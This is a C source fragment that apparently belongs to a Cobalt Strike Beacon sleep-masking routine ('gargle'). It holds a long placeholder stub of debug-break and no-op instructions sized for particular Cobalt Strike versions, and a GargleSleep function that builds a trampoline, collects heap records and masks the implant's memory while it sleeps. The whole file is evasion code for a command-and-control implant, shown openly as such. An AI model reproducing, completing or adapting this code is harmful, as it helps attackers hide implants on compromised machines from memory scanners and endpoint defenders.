/* gargle! */
#include <windows.h>
#include <intrin.h>
#include "beacon.h"
#include "gargleint.h"
#include "track_memory.h"


typedef void(*GARGLEF)(GARGLEP * parms, void (__stdcall *Sleep)(DWORD), DWORD time);

/* this is the stub function we copy over */
/* For CS 4.4 the pattern size is 268 */
/* For CS 4.5 the pattern size is 768 */
static void _gargle_it(GARGLEP * parms, void(__stdcall *pSleep)(DWORD), DWORD time) {
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
}

static void setup_trampoline2() {
	gargle_trampoline(setup_trampoline2, _gargle_it);
}

void GargleSleep(DWORD time) {
	GARGLEF func;

	if (setting_int(SETTING_GARGLE_NOOK) == 0 || threadcount > 0) {
		Sleep(time);
	}
	else {
		/* create our trampoline, please */
		setup_trampoline2();

		/* cast our trampoline to our function */
		func = (GARGLEF)gtrampoline;

		/* get the heap sections to mask in case new items have been added. */
		gparms->heap_records = track_memory_get_heap_records_to_mask();

		/* stomp on our Beacon data */
		func(gparms, Sleep, time);
	}
}